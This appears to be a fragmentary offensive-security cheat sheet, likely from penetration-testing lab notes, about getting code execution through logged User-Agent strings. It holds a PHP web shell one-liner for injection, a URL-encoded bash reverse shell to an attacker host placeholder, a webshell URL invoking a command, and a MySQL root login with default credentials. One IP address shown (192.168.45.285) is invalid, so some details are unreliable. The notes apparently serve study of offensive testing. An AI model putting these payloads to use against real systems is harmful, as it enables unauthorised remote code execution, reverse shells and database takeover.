...
- Check for stored User Agents on Dashboard logs - in User-Agent
	```php
	<?php echo system($_GET['cmd']); ?>
	```
In URL- Reverse Shell: ``bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<KALI_IP>%2F<PORT>%200%3E%261%22``
...
## `Executable Reverseshell on pwsh`
`pwsh`
...
http://192.168.45.285/tmp/webshell.php?cmd=id
 ...
 mysql -u root -p'root' -h 192.168.114.16 -P 3306 --skip-ssl-verify-server-cert
